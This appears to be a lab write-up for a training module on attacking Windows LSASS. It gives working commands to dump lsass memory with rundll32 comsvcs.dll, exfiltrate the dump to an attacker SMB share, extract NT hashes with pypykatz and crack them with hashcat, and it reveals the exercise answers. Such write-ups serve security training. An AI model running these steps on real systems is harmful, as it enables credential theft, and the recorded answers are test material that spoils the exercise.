# Attacking LSASS

### What is the name of the executable file associated with the Local Security Authority Process?

lsass.exe

### Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`

A file called `lsass.DMP` is created and saved in:

```powershell
C:\Users\htb-student\AppData\Local\Temp\lsass.DMP
```

OR&#x20;

**Finding LSASS PID in PowerShell**

```powershell
Get-Process lsass
#Creating lsass.dmp using PowerShell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

now we transfer it into our linux machine

```bash
#1
impacket-smbserver shared -smb2support /tmp/shared
#2
move C:\Users\htb-student\AppData\Local\Temp\lsass.DMP \\10.10.14.179\shared
```

Running Pypykatz

```bash
pypykatz lsa minidump lsass.DMP
== MSV ==
                Username: Vendor
                Domain: FS01
                LM: NA
                NT: 31f87811133bc6aaa75a536e77f64314
                SHA1: 2b1c560c35923a8936263770a047764d0422caba
                DPAPI: NA
```

now we try to crack vendor NT hash

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt  
31f87811133bc6aaa75a536e77f64314:Mic@123
```

```
Mic@123
```
